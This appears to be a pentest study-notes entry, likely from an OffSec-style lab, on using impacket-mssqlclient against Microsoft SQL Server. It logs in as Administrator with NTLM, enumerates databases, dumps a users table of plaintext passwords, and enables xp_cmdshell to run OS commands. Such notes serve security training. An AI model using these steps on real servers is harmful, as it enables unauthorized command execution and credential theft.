### impacket-mssqlclient
```sh

# -windows-authを指定することでKerberos認証ではなく、NTLM認証を強制できる
impacket-mssqlclient Administrator:Password@192.168.1.1 -windows-auth

SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT @@version;

# Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
# 	Sep 24 2019 13:48:23
# 	Copyright (C) 2019 Microsoft Corporation
# 	Express Edition (64-bit) on Windows Server 2022 Standard 10.0 <X64> (Build 20348: ) (Hypervisor)

SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT name FROM sys.databases;
# name
# master
# offsec

SQL (SQLPLAYGROUND\Administrator  dbo@master)> SELECT * FROM offsec.information_schema.tables;
# TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
# -------------   ------------   ----------   ----------   
# offsec          dbo            users        b'BASE TABLE'

SQL>select * from offsec.dbo.users;
# username     password     
# ----------   ----------   
# admin        lab        
# guest        guest 

EXECUTE sp_configure 'show advanced options', 1;
# [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
# [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
# nt service\mssql$sqlexpress
```